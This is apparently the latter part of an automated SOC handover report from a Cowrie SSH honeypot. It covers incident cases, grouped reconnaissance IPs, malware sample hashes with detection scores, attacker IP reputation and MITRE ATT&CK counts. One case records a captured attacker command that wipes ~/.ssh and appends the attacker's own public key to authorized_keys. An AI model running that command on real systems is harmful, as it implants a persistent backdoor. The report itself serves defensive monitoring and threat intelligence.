| `2026-05-16 14:56:22` | `cowrie.command.failed` |
| `2026-05-16 14:56:23` | `cowrie.log.closed` |
| `2026-05-16 14:56:23` | `cowrie.session.params` |
| `2026-05-16 14:56:23` | `cowrie.command.input` |
| `2026-05-16 14:56:23` | `cowrie.session.file_download` |
| `2026-05-16 14:56:23` | `cowrie.log.closed` |
| `2026-05-16 14:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cafc2500871

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:56 |
| **Last Seen** | 2026-05-16 14:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:56:27` | `cowrie.session.connect` |
| `2026-05-16 14:56:27` | `cowrie.client.version` |
| `2026-05-16 14:56:28` | `cowrie.client.kex` |
| `2026-05-16 14:56:29` | `cowrie.login.success` |
| `2026-05-16 14:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44af92904f4d

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:58 |
| **Last Seen** | 2026-05-16 14:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:58:09` | `cowrie.session.connect` |
| `2026-05-16 14:58:09` | `cowrie.client.version` |
| `2026-05-16 14:58:09` | `cowrie.client.kex` |
| `2026-05-16 14:58:10` | `cowrie.login.success` |
| `2026-05-16 14:58:11` | `cowrie.session.params` |
| `2026-05-16 14:58:11` | `cowrie.command.input` |
| `2026-05-16 14:58:11` | `cowrie.command.failed` |
| `2026-05-16 14:58:12` | `cowrie.log.closed` |
| `2026-05-16 14:58:12` | `cowrie.session.params` |
| `2026-05-16 14:58:12` | `cowrie.command.input` |
| `2026-05-16 14:58:13` | `cowrie.session.file_download` |
| `2026-05-16 14:58:13` | `cowrie.log.closed` |
| `2026-05-16 14:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2d7d6be2196

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-05-16 14:58 |
| **Last Seen** | 2026-05-16 14:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 14:58:17` | `cowrie.session.connect` |
| `2026-05-16 14:58:17` | `cowrie.client.version` |
| `2026-05-16 14:58:17` | `cowrie.client.kex` |
| `2026-05-16 14:58:19` | `cowrie.login.success` |
| `2026-05-16 14:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.182.234[.]69` | **127** | 2026-05-16 13:39 | 2026-05-16 14:58 | 91m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **22** | 2026-05-16 13:39 | 2026-05-16 14:52 | 33m | 0 | `T1592` | 🟠 MEDIUM |
| `39.144.144[.]7` | **11** | 2026-05-16 14:43 | 2026-05-16 14:58 | 19m | 0 | `T1592` | 🟠 MEDIUM |
| `175.107.31[.]20` | **10** | 2026-05-16 14:04 | 2026-05-16 14:59 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `179.62.216[.]38` | **6** | 2026-05-16 14:49 | 2026-05-16 14:58 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `193.34.53[.]178` | **4** | 2026-05-16 14:21 | 2026-05-16 14:22 | 4m | 0 | `T1592` | 🟢 LOW |
| `159.203.20[.]239` | **3** | 2026-05-16 14:08 | 2026-05-16 14:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.103.110[.]123` | **2** | 2026-05-16 14:45 | 2026-05-16 14:47 | 4m | 0 | `T1592` | 🟢 LOW |
| `149.255.39[.]70` | 1 | 2026-05-16 14:28 | 2026-05-16 14:29 | 31s | 0 | `T1592` | 🟢 LOW |
| `161.35.8[.]0` | 1 | 2026-05-16 13:46 | 2026-05-16 13:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `99.240.71[.]234` | 1 | 2026-05-16 14:07 | 2026-05-16 14:07 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `193.34.53[.]178` | PL | Mediasat s.c. | **100** ⚠️ | 0 |
| `99.240.71[.]234` | CA | Rogers Cable Inc. FLFRD | **100** ⚠️ | 5 |
| `149.255.39[.]70` | US | Hivelocity LLC | **100** ⚠️ | 2 |
| `107.182.234[.]69` | US | Hosting Services, Inc. | **100** ⚠️ | 1 |
| `175.107.31[.]20` | PK | National Telecommunication Corporation | **100** ⚠️ | 2 |
| `179.62.216[.]38` | AR | GRUPO EQUIS S.A. | **100** ⚠️ | 33 |
| `14.103.110[.]123` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `159.203.20[.]239` | CA | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `45.148.120[.]187` | NL | SpectraIP B.V. | **100** ⚠️ | 0 |
| `161.35.8[.]0` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 33 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 216 cases |
| Tool 34  | Credential Extractor        | ✅ 20 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (6.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 11 recon entry/entries in table (8 group(s) consolidating 185 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-16T15:00:41Z_
